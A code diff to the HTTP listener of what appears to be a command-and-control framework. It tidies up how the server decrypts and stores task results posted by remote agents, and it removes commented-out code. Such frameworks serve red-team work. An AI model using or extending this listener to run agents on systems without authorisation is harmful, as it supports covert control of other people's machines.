@@ -26,7 +26,6 @@ class HTTP_listener:
             self.key = key[0][0]
         else:
             self.key = key_init()
-            # self.stash.sql_stash( '''INSERT INTO key_store(enc_key, list_name, list_type, alive) VALUES( ?, ?, ?, ? )''', (self.key, name, 'HTTPS', 'True') )
             self.stash.register_list(name, 'HTTPS', self.key, ip, port)
 
         html_fold = path.join(getcwd(), 'core' ,'html')
@@ -73,17 +72,15 @@ class HTTP_listener:
         def ret_res(code):
             if self.stash.check_code(code):
                 enc_result = request.form.get('result')
-                result = DECRYPT(enc_result, self.key)
-                # success(f'Beacon name: {name} - Results to task {code} -> {result}')
-                # self.stash.sql_stash( '''INSERT INTO commands_history(output) VALUES( ? ) WHERE command_code = ? ;''', (result, code) )
+                if enc_result:
+                    result = DECRYPT(enc_result, self.key)
+                else:
+                    result = 'NA'
                 self.stash.sql_stash( 'UPDATE commands_history SET output = ? WHERE command_code = ? ; ', (result, code) )
                 if 'VALID agent renamed to ' in result:
                     agent_name = result.split()[-1]
                     old_name = self.stash.get_agent_from_comm(code)
                     self.stash.sql_stash( 'UPDATE agents SET agent_name = ? WHERE agent_name = ? ; ', (agent_name, old_name) )
-                # elif 'VALID agent dead' in result:
-                #     agent_name = result.split()[-1]
-                #     self.stash.sql_stash( '''UPDATE agents SET alive = ? WHERE agent_name = ? ;''', (False, agent_name) )
                 return ('', 204)
             else:
                 error(f'Command Code {code} not found!')
@@ -115,18 +112,6 @@ class HTTP_listener:
 
         self.server.start()
         self.running = True
-
-        # self.server = Process(target=self.run)
-
-        # ## no server banner
-        # cli = sys.modules['flask.cli']
-        # cli.show_server_banner = lambda *x: None
-
-        # self.daemon = threading.Thread(name = self.name, target = self.server.start, args = (), daemon = True)
-        # # self.daemon.daemon = True
-        # self.daemon.start()
-
-        # self.running = True
 
     def stop(self):
         self.server.terminate()
